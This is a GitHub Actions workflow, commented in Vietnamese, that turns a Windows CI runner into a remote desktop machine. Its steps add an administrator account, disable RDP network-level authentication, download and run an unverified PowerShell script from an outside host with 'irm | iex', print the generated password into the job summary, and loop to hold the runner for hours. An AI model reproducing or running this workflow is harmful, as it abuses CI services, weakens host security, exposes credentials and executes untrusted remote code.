name: ThyoCloud Workspace (RDP + XyDesk Setup)

on:
  workflow_dispatch:

jobs:
  deploy-workspace:
    runs-on: windows-2022
    timeout-minutes: 360

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      # ============================================================
      # STEP 1: SETUP RDP ACCOUNT (Cần thiết để kết nối)
      # ============================================================
      - name: Setup RDP Account
        shell: powershell
        run: |
          Write-Host "Setting up RDP account..."
          $RPASS = -join ((1..12) | ForEach-Object { "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$"[(Get-Random -Maximum 68)] })
          
          net user Admin $RPASS /add
          net localgroup "Administrators" Admin /add
          net localgroup "Remote Desktop Users" Admin /add
          Set-LocalUser -Name Admin -PasswordNeverExpires $true

          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

          "RDP_USER=Admin" >> $env:GITHUB_ENV
          "RDP_PASS=$RPASS" >> $env:GITHUB_ENV

      # ============================================================
      # STEP 2: TÍCH HỢP SCRIPT XYDESK TỪ FILE .BAT CỦA BẠN
      # ============================================================
      - name: Run XyDesk Optimization Script
        shell: powershell
        run: |
          Write-Host "Đang tải và chạy script tối ưu hóa từ XyDesk..."
          # Sử dụng đúng đoạn mã PowerShell trong file .bat của bạn
          $scriptBlock = {
              [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
              try { 
                  irm https://xydeskremote.biz.id/onmic.ps1 | iex 
              } catch { 
                  Write-Host "Server chính lỗi, thử server dự phòng..."
                  irm https://api.xydeskremote.biz.id/onmic.ps1 | iex 
              }
          }
          
          try {
              & $scriptBlock
              Write-Host "[SUCCESS] Đã chạy xong script tối ưu hóa."
          } catch {
              Write-Host "[WARNING] Không thể chạy script từ XyDesk (Có thể web của họ đang sập hoặc chặn IP GitHub)."
          }

      # ============================================================
      # STEP 3: SET WALLPAPER (Giữ nguyên tính năng của bạn)
      # ============================================================
      - name: Set Wallpaper
        shell: powershell
        run: |
          Write-Host "Setting up wallpaper..."
          $LocalWallpaper = Join-Path $env:GITHUB_WORKSPACE "Wallpaper\wallpaper.png"
          if (Test-Path $LocalWallpaper) {
              $DestWallpaper = "C:\Windows\Web\Wallpaper\thyo_bg.png"
              Copy-Item -Path $LocalWallpaper -Destination $DestWallpaper -Force
              
              $tsPolicyPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
              New-Item -Path $tsPolicyPath -Force | Out-Null
              Set-ItemProperty -Path $tsPolicyPath -Name "fNoRemoteDesktopWallpaper" -Value 0 -Type DWord -Force
              
              $RegPath = "HKCU:\Control Panel\Desktop"
              Set-ItemProperty -Path $RegPath -Name Wallpaper -Value $DestWallpaper
              Set-ItemProperty -Path $RegPath -Name WallpaperStyle -Value "10"
              Set-ItemProperty -Path $RegPath -Name TileWallpaper -Value "0"
              
              $csharpCode = 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport("user32.dll", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'
              Add-Type -TypeDefinition $csharpCode
              [Wallpaper]::SystemParametersInfo(20, 0, $DestWallpaper, 0x01 -bor 0x02)
          }

      # ============================================================
      # STEP 4: XUẤT THÔNG TIN KẾT NỐI RDP
      # ============================================================
      - name: Publish Connection Details
        shell: powershell
        run: |
          $summaryFile = $env:GITHUB_STEP_SUMMARY
          
          Add-Content -Path $summaryFile -Value "## ThyoCloud Workspace (Tối ưu hóa XyDesk)" -Encoding utf8
          Add-Content -Path $summaryFile -Value "" -Encoding utf8
          Add-Content -Path $summaryFile -Value "### 🔑 Thông tin RDP:" -Encoding utf8
          Add-Content -Path $summaryFile -Value "- **Username:** ``$env:RDP_USER``" -Encoding utf8
          Add-Content -Path $summaryFile -Value "- **Password:** ``$env:RDP_PASS``" -Encoding utf8
          Add-Content -Path $summaryFile -Value "" -Encoding utf8
          Add-Content -Path $summaryFile -Value "> **Lưu ý:** Script XyDesk đã được tích hợp. Bạn cần dùng Tunnel (như Ngrok/Bore) để lấy IP:Port kết nối vào RDP." -Encoding utf8

      # ============================================================
      # STEP 5: GIỮ SESSION SỐNG
      # ============================================================
      - name: Keep session alive
        shell: powershell
        run: |
          while ($true) {
              Write-Host "[$(Get-Date)] Session Active - Đang chờ kết nối..."
              Start-Sleep -Seconds 300
          }
